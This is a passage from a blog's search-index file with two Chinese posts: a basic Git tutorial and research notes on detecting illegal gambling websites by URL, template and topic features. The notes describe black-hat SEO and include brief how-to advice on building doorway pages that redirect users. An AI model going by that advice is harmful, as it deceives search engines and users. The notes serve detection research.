仅比较file.txt的差异内容</span></span><br><span class="line">git diff xx file.txt</span><br></pre></td></tr></table></figure></li></ol><h2 id="版本回退"><a class="markdownIt-Anchor" href="#版本回退"></a> 版本回退</h2><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240617171033362.png" alt="image-20240617171033362" /></p><p>使用<code>git log</code>查看提交历史，前面即历史提交的标识符</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240617171207610.png" alt="image-20240617171207610" /></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 回退上一个版本</span></span><br><span class="line">git reset --soft HEAD^</span><br><span class="line"><span class="comment"># 回退到标识符对应的版本</span></span><br><span class="line">git reset --soft 5af90b8</span><br></pre></td></tr></table></figure><h2 id="删除文件"><a class="markdownIt-Anchor" href="#删除文件"></a> 删除文件</h2><p>直接从工作区和暂存区删除，但后续仍然要提交commit</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">rm</span> file.txt</span><br></pre></td></tr></table></figure><p>直接放入回收站的话，注意后续仍要进行add和commit操作</p><h2 id="gitignore忽略文件"><a class="markdownIt-Anchor" href="#gitignore忽略文件"></a> gitignore忽略文件</h2><p>有些时候，我们可能希望设置不push项目目录下的某些内容上去，如密钥文件等。</p><p>创建gitignore文件，在里面写入需要进行忽略的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> access.log &gt; .gitignore</span><br><span class="line"><span class="built_in">cat</span> .gitignore</span><br></pre></td></tr></table></figure><p>规则：<br /><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240619103817870.png" alt="image-20240619103817870" /></p><h1 id="git-分支"><a class="markdownIt-Anchor" href="#git-分支"></a> Git 分支</h1><p>在Git中新建一个项目后，默认有一个分支，即主分支。主分支一般表示项目的稳定版本，主分支应该包含稳定没有 Bug 的代码，并保持随时可以发布的状态，对于小型项目来说，只有一个主分支就够用了，每次我们提交都会创建一个commit节点。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git commit -m <span class="string">&quot;c1&quot;</span></span><br><span class="line">git commit -m <span class="string">&quot;c2&quot;</span></span><br><span class="line">git commit -m <span class="string">&quot;c3&quot;</span></span><br></pre></td></tr></table></figure><p>上面的命令会创建三个commit节点，此时master分支如下图所示，代码经历了C1，C2，C3这三个版本，且master分支目前指向C3这个提交版本。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/2518be4050ad3f494e01668d5cae1674.png" alt="img" /></p><p>如果项目功能较复杂，且需要多次提交，不建议在主分支直接修改。主分支上应该只包合并提交，所有的迭代应该都在分支上进行。如果是简单的改动，直接在主分支修改也是可以的。</p><p>当有新的功能要开发时，应该新建一个功能分支，比如创建一个名为a的分支，并切换到a分支，命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b a</span><br></pre></td></tr></table></figure><p>创建新分支时，新分支默认指向的代码提交版本为当前分支所指向的代码提交版本，比如这里新分支a指向的提交将为C3。此时当前分支为a，所指向的提交为C3。</p><h1 id="远程仓库同步"><a class="markdownIt-Anchor" href="#远程仓库同步"></a> 远程仓库同步</h1><p>我们上面学习的都是在本地的操作，只是将文件提交到本地仓库，这样并不能实现和其他开发者的同步。我们还需要一个代码托管平台作为远程仓库，比如这里我们选择 Github。</p><p>Git 和 Github 的连接在我们前面的初始化配置中已经完成。</p><h2 id="将github项目pull到本地"><a class="markdownIt-Anchor" href="#将github项目pull到本地"></a> 将github项目pull到本地</h2><p><strong>什么是pull</strong>：将远程代码仓库中(新)的内容下载到本地，并更新本地代码仓库的内容</p><p><strong>第一次pull：</strong></p><p>首先需要在本地创建一个空文件夹，作为项目的存放仓库。然后进入该文件夹下，打开Git Bush，输入以下命令将该目录初始化为Git仓库。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure><p>然后将这个本地仓库连接到Github上的对应项目</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># git remote add 仓库命名 远程仓库地址（github上项目的HTTPS协议地址）</span></span><br><span class="line">git remote add origin https://github.com/soda-VV/soda-VV.github.io.git</span><br></pre></td></tr></table></figure><blockquote><p>如果不小心填错了，可以使用指令清除地址重新设置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote remove origin </span><br></pre></td></tr></table></figure><p>同样也可以执行命令查看是否连接成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote -v</span><br></pre></td></tr></table></figure></blockquote><p>然后，使用Pull指令拉取代码，从远程源的主分支更新代码到本地</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># git pull origin &lt;branch-name&gt;</span></span><br><span class="line">git pull origin master</span><br></pre></td></tr></table></figure><p><strong>后续拉取github上的更新到本地：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull origin master</span><br></pre></td></tr></table></figure><h2 id="将本地项目push到github"><a class="markdownIt-Anchor" href="#将本地项目push到github"></a> 将本地项目push到github</h2><ol><li><p><strong>什么是push</strong>：将本地库的内容推送到远程仓库中</p></li><li><p><strong>第一次push</strong>：</p><p>同样的，在本地项目文件夹内初始化Git仓库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure><p>执行add命令<strong>将整个文件夹添加到本地仓库</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br></pre></td></tr></table></figure><p>将这个本地仓库连接到Github上的对应项目</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># git remote add 仓库命名 远程仓库地址（github上项目的HTTPS协议地址）</span></span><br><span class="line">git remote add origin https://github.com/soda-VV/soda-VV.github.io.git</span><br></pre></td></tr></table></figure><p>将本地更新后的代码上传到GitHub只需要</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git commit -m &quot;第一次上传&quot;</span><br><span class="line">git push origin master/main</span><br></pre></td></tr></table></figure><blockquote><p>注意：</p><p>如果推送失败的话，可以看一下仓库命名（origin）是否出错，或者是分支名称写错了（为main分支）</p></blockquote></li><li><p><strong>后续推送本地库的内容到远程仓库：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;第n次上传&quot;</span></span><br><span class="line">git push origin master</span><br></pre></td></tr></table></figure></li></ol><h2 id="多人协作"><a class="markdownIt-Anchor" href="#多人协作"></a> 多人协作</h2><p>如果在多个远程设备上操作，记得开始进行今日的操作前要先：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull origin master/main</span><br></pre></td></tr></table></figure><p>完成所有操作准备离开时要记得：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m ‘xx’</span><br><span class="line">git push origin master</span><br></pre></td></tr></table></figure><p>tip: 要保证本地库和server是同步的，不然忘记先pull，若其他远程设备上已经push了新的内容，自己这里是push不上去的，只能进行git pull合并，这个操作还会覆盖你已经更改了的部分，会非常痛苦。</p><h2 id="冲突问题"><a class="markdownIt-Anchor" href="#冲突问题"></a> 冲突问题</h2><p>在使用Git的时候，可能会出现这样的问题：<strong>你本地有未提交的更改，但是别人也修改并 push 到远程了</strong>，这种情况下我们如何进行同步呢？</p><h1 id="常见问题"><a class="markdownIt-Anchor" href="#常见问题"></a> 常见问题</h1><ul><li><strong>error: src refspec master does not match any</strong>：<ul><li>解决：<a href="https://blog.csdn.net/qq_38198952/article/details/82792279">https://blog.csdn.net/qq_38198952/article/details/82792279</a></li></ul></li></ul><h1 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章"></a> 参考文章</h1><p>侵权删：</p><ul><li><a href="https://www.bilibili.com/video/BV1HM411377j?p=10&amp;vd_source=78fe120d7956471b1c17e0b76956e9f9">【GeekHour】一小时Git教程</a></li><li><a href="https://devpress.csdn.net/cloud-native/64ffdfd8993dd34278ee2d52.html">https://devpress.csdn.net/cloud-native/64ffdfd8993dd34278ee2d52.html</a></li><li><a href="https://blog.csdn.net/daydayup858/article/details/128201627">https://blog.csdn.net/daydayup858/article/details/128201627</a></li><li><a href="https://zhuanlan.zhihu.com/p/438410278">https://zhuanlan.zhihu.com/p/438410278</a></li><li><a href="https://blog.csdn.net/qq_45583787/article/details/126882580">https://blog.csdn.net/qq_45583787/article/details/126882580</a></li><li><a href="https://blog.csdn.net/vir_lee/article/details/80464408">https://blog.csdn.net/vir_lee/article/details/80464408</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
            <tag> 版本控制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『科研』赌博网站识别方法研究</title>
      <link href="/posts/3cca.html"/>
      <url>/posts/3cca.html</url>
      
        <content type="html"><![CDATA[<h1 id="背景知识"><a class="markdownIt-Anchor" href="#背景知识"></a> 背景知识</h1><h2 id="黑帽seo"><a class="markdownIt-Anchor" href="#黑帽seo"></a> 黑帽SEO</h2><ol><li><p><strong>概念</strong></p><p>黑帽SEO是指通过作弊手段，让站点快速提升排名的一类SEO技术，或者说是黑客技术，比如说：黑链（暗链）、站群、网站劫持、桥页等，黑帽SEO能够快速提升排名，但属于是违规作弊行为。</p></li><li><p><strong>一些黑帽SEO的方法</strong></p><p><strong>1）斗篷法（Cloaking）</strong></p><p>斗篷法指站长<strong>将一个网页用两个不同版本的页面，一个版本给搜索引擎看，一个版本给用户浏览</strong>。而搜索引擎只能看到斗篷。</p><p>​如果用户访问，那返回的可能是一个高大上的页面，如果是搜索引擎访问，返回的可能是一个适合优化的页面。斗篷法基本用在灰色行业或是黑色行业中。桥页也叫：门页、跳页、过渡页，<strong>通常是用软件自动生成大量包含关键词的网页，然后从这些网页做自动转向到主页。</strong></p><p>​目的是希望这些以不同关键词为目标的桥页在搜索引擎中得到好的排名。当用户点击搜索结果的时候，会自动转到主页。有的时候是在桥页上放上一个通往主页的链接，而不自动转向。大部分情况下，这些桥页都是由软件生成的。你可以想象，生成的文字是杂乱无章，没有什么逻辑的。如果是由人写出来的真正包含关键词的文章，就不是桥页了。所谓的桥页也叫过渡页，是指一个页面打开之后会自动（或手动）转向到别的页面。（注意：这种方法在baidu里面可以使用，但不要用在google里！），我们来看一个html格式的桥页的全部代码：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/v2-fdfc148d9726faefb64194d8c27a7009_720w.jpg" alt="img" /></p><p>这个页面打开后会在0秒（由content=“0定义时间）内转向到目标网页（由meta标签中的url=”&gt;定义转向的站点），所以大家只要稍加修改，就可以变成你自己的桥页了。我们为我们的所有商品都建立一个这样的页面，每一个页面里都依次按照我们的商品设置不同的关键字，然后依次把这些页面上传到你的目录，比如为上传后的地址为：…那么我们再依次把这些地址一一的提交给搜索引擎，这样，当搜索引擎搜索到这些桥页并被用户打开后，会马上转入到你指定的主页。这样的话你的这些产品被搜索到的机会是不是就大大提高了？</p><p>对于桥页的建立，关键是还是关键字要选择好，就拿上面那个手机网站的例子来说，我们要依次为每一个关键字都要做一个单独的桥页，关键字要尽量的全。再有，一个关键字我们也完全可以做多个内容完全相同但名字一定要不相同的桥页，并一一的提交给搜索引擎来增加被搜索到的机率。它针对搜索引擎而作，通过根据特定的搜索词制作一些页面获得较好的排名，引导用户进入主站。有的时候是根据搜索引擎算法制作页面，迎合搜索引擎算法获得好的排名。但不管是那一种，它实际上都属于一种seo作弊行为。</p><p>2）<strong>桥页跳转方式</strong></p><ul><li><p>自动跳转，就像上面讲的，利用自动跳转代码，直接跳转到目标页，优点：用户不知道跳转到了其他页，比较信任。缺点：容易被搜索引擎发现。</p></li><li><p>手动跳转，在桥页上制作蓝色显眼链接，引导用户。优点：不容易被搜索引擎发现，缺点：用户信任度降低。</p></li></ul></li></ol><h1 id="赌博网站识别方法"><a class="markdownIt-Anchor" href="#赌博网站识别方法"></a> 赌博网站识别方法</h1><h2 id="传统方法"><a class="markdownIt-Anchor" href="#传统方法"></a> 传统方法</h2><h3 id="黑名单"><a class="markdownIt-Anchor" href="#黑名单"></a> 黑名单</h3><p>维护恶意网站的 IP 地址、域名黑名单，这些信息多是通过人工举报、客户端分析技术所得。可以将获取到的URL先通过黑名单过滤，确认为违法网站之后也加入黑名单中</p><h3 id="静态检测"><a class="markdownIt-Anchor" href="#静态检测"></a> 静态检测</h3><ol><li><p>原理：基于网站静态数据，如：</p><ul><li><p>网站URL：</p><p>基于url相似度进行聚类：[基于URL特征检测的违法网站识别方法_凡友荣.pdf](file:///D:/college/技术/网站信息抽取/基于URL特征检测的违法网站识别方法_凡友荣.pdf)</p></li><li><p>网站关键词</p></li></ul></li><li><p>优点：理论完备、技术成熟</p></li><li><p>缺点：数据源限于静态网页数据、对未知违法网站检测不够及时</p></li></ol><h3 id="动态检测"><a class="markdownIt-Anchor" href="#动态检测"></a> 动态检测</h3><ol><li><p>方法</p><ul><li><p>通过与网站之间的通信，获取网站相关的网络行为并进行分析</p></li><li><p>使用蜜罐系统访问网页并确定网页是否存在恶意行为，同时对攻击者的各种攻击行为进行分析，找到有效的应对方法</p></li></ul></li><li><p>优点：更主动</p></li><li><p>缺点：实施难度大，针对挂马类网站效果明显，但对于常见的赌博、传销类网站效果不佳</p></li></ol><h3 id="新型方法"><a class="markdownIt-Anchor" href="#新型方法"></a> 新型方法</h3><h4 id="基于模板检测"><a class="markdownIt-Anchor" href="#基于模板检测"></a> 基于模板检测</h4><p>参考论文：[基于模板检测的违法网站识别方法_张瀚珑.pdf](file:///D:/college/技术/网站信息抽取/基于模板检测的违法网站识别方法_张瀚珑.pdf)</p><p>违法网站运营人员大多采用建站脚本技术自动生成违 法网 站，如 Linux + Apache + Mysql /MariaDB + Perl /PHP /Python( LAMP)。本文将识别 1 个网站是否是违法网站转化为检测其是否使用了违法网站模板，提出了一种基于网站模板检测违法网站的快速有效的识别方法</p><p><strong>思路：</strong></p><p>( 1 ) HTTP POST 数 据 预 处 理。提 取 HTTP POST 报文中的关键值，通过 MD5 哈希算法计算 该 HTTP POST 的特征值。</p><p>( 2) 网站间相似度计算。根据网站之间的特 征值集合，计算出网站间的相似度。</p><p>( 3) 违法网站模板提取。网站根据相似度形成 聚类，设定阈值，得到有效聚类，再通过人工干预，确 定违法网站聚类，从中提取违法网站模板特征。</p><p>( 4) 违法网站识别。基于步骤( 3) 得到的违 法网站模板特征，计算未知网站与违法网站模板 相似度</p><h4 id="基于网站主题的检测"><a class="markdownIt-Anchor" href="#基于网站主题的检测"></a> 基于网站主题的检测</h4><p>参考论文：[基于PAM概率主题模型的赌博网站检测方法_李国静.pdf](file:///D:/edge downloads/基于PAM概率主题模型的赌博网站检测方法_李国静.pdf)</p><p>概率主题模型中，每篇文档均被看作是由若干 隐含主题所构成，而每个主题都由特定单词所体现。 因此，不同单词的分布被看作是不同的隐含主题，而每 个文档则是这些主题在特定比例下的组合。针对赌博 网站检测问题，本文将网站也看作是一个特定的文档， 通过抽取网站的 HTML、脚本语言等信息，形成网站的 文本信息。由于网站所呈现的主题由网站内容所决 定，因此通过抽取网站文本信息的主题，可以有效地对 网站进行主题分类，从而针对“赌博”性质的网站实施 检测</p><h1 id="一篇较有代表性的论文导读"><a class="markdownIt-Anchor" href="#一篇较有代表性的论文导读"></a> 一篇较有代表性的论文导读</h1><p><a href="https://www.researchgate.net/profile/Zhou-Li-19/publication/337453768_Casino_royale_a_deep_exploration_of_illegal_online_gambling/links/5dedde4ea6fdcc283711da0f/Casino-royale-a-deep-exploration-of-illegal-online-gambling.pdf">Casino Royale: A Deep Exploration of Illegal Online Gambling (researchgate.net)</a></p><ol><li><p><strong>赌博网站存在的特点</strong></p><ul><li><p>色彩十分鲜艳</p></li><li><p>搜索、推广：采用了黑帽SEO优化</p><p>网站SEO优化的一些措施:<a href="https://websiteseochecker.com/">Website SEO Checker | Full SEO Analysis On-Page Off-Page</a></p></li><li><p>大多数赌博网站都是封闭的，即网站的相关链接均指向赌博网站的其他内容或者相关赌博信息；相反，一般正常的网站则相对开放，网站链接会在不同主题的网站之间跳转。 因此，根据这个特性，本文对所需要进行检测的网站随机采样多个页面内容，通过对这些关联页面进行主题提取，若多个页面均是关于“赌博”主题的，则在很大概率上说明此类网站是赌博网站; 相反，不同页面的主题差异较大，则说明此类网站是赌博网站的概率就低。</p></li><li><p>赌博网站的特点之一是善于伪装，为了不容易被识别为赌博网站，有些赌博网站的主页看起来就像网址大全、新闻门户的主页，其中很多链接也会指向正常的服务而非赌博项目，还会有动态更新页面内容的赌博网站，当你浏览时间超过一定时间，其主页内容才会从看似正常的服务一下变更为赌博网站页面。赌博网站还具有一个特点，他们没有自己的转账服务，所以一定会指向电子银行的域名，同理，还可能存在邮箱等通 讯服务的域名</p></li></ul></li><li><p><strong>特征选择</strong></p><ul><li><p>支付方式特征提取</p></li><li><p>网站内容检测：赌博类别</p><ul><li>存储类别</li><li>HTML相似性</li></ul></li><li><p>网站结构特征：</p><p>从网站上抽取的 文本信息附上其在 HTML 的标签。例如: HTML 文本 中<code>＜ title ＞ 澳门新葡京官网 ＜ /title ＞ </code>，分词后加入词袋模型的单词为: <code>t 澳门、t 新葡京、t 官网</code>，其中 “t”表示单词在 HTML 的标签为“title”。为了避免标 签区分得过细，导致词袋模型中的单词在主题上的分 布过于稀疏，本文只选取 HTML 中三个主要的标签，即 “title”“head”“body”，在各个标签下的单词分别附加 上相应的标识，以做区分。通过针对不同标签下的单 词对于网站主题的影响，设置不同的权重，从而实现对 网站结构信息的利用，挖掘网站的主题</p></li><li><p>域名与URL：</p><p>实验数据使用域名，而非完整 URL。一方面是因为域名和 URL 存在包含关系，一个域名可以有多个 URL，直接使用域名效率相对更高，制作黑白名单所需要的存储空间更小，另一方面 URL 的命名规则相对容易变化且成本较低，域名注册需要备案，虽然也可以批量注册但成本相对较高，即域名相对稳定不易变化。</p></li><li><p>URL特征：<a href="https://ieeexplore.ieee.org/stamp/stamp.jsp?arnumber=8730309">IEEE Xplore Full-Text PDF:</a></p><p>长度、是否包含短网址（<a href="https://www.cnblogs.com/lsdb/p/10119668.html">短网址是什么 - 诸子流 - 博客园 (cnblogs.com)</a>）、是否包含@、是否包含//（第七个字符之后）、“-”、“.”、SSL证书（浏览器地址栏查看站点信息）、域名到期时间（与域名特征合并？）、是否为标准端口号（抓包获得）、favicon/icon是否是从其他域名加载的（查看页面源代码中的rel=”icon”、shortcut icon即可）、是否为https</p><ul><li>添加：是否url上的链接都指向一个域（闭合）</li></ul></li><li><p>网页源码特征：<a href="https://ieeexplore.ieee.org/stamp/stamp.jsp?arnumber=8730309">IEEE Xplore Full-Text PDF:</a></p><ul><li>specify the percentage of resources from the same domain that is requested by a<br />single URL（没懂）</li><li>网页中锚点的比例</li><li>标签中的链接比例（meta、script 和 link）</li><li>是否包含电子邮件地址</li><li>SFH是否包含一个空字符或’‘about:blank’'，域SFH的名称与网页是否相同(SFH不知道是什么)</li></ul></li></ul></li><li><p><strong>使用的工具</strong></p><ul><li><p><a href="http://web.archive.org/%EF%BC%9A%E8%8E%B7%E5%8F%96%E7%BD%91%E9%A1%B5%E5%BF%AB%E7%85%A7%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%AF%B9%E5%B7%B2%E7%BB%8F%E5%A4%B1%E6%95%88%E7%9A%84%E7%BD%91%E7%AB%99%E8%8E%B7%E5%8F%96%E5%85%B6%E6%96%87%E6%9C%AC%E4%B8%8EDOM%E6%A0%91%E4%BF%A1%E6%81%AF+">http://web.archive.org/：获取网页快照，可以对已经失效的网站获取其文本与DOM树信息+</a></p></li><li><p><a href="http://www.alexa.cn/%EF%BC%9A%E6%9C%8D%E5%8A%A1%E5%99%A8IP%EF%BC%88%E5%A4%9A%E4%B8%BA%E5%A4%96%E5%9B%BD%EF%BC%89,%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%B1%BB%E5%9E%8B%E3%80%81%E6%B3%A8%E5%86%8C%E5%95%86%E3%80%81%E5%88%9B%E5%BB%BA/%E6%9B%B4%E6%96%B0/%E8%BF%87%E6%9C%9F%E6%97%B6%E9%97%B4%E3%80%81%E6%B3%A8%E5%86%8C%E7%94%B5%E8%AF%9D%E3%80%81ICP%E5%A4%87%E6%A1%88">http://www.alexa.cn/：服务器IP（多为外国）,服务器类型、注册商、创建/更新/过期时间、注册电话、ICP备案</a></p></li><li><p><a href="https://moz.com/learn/seo/domain-authority">Domain Authority - Moz</a>：DV域权威值查询</p><p><a href="https://delhiseocompany.com/page-authority-vs-domain-authority-which-one-has-more-value/">Page Authority vs. Domain Authority – Which one has more value? - Delhi SEO Company</a>：DV与PV的相关知识</p></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 科研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网站识别 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
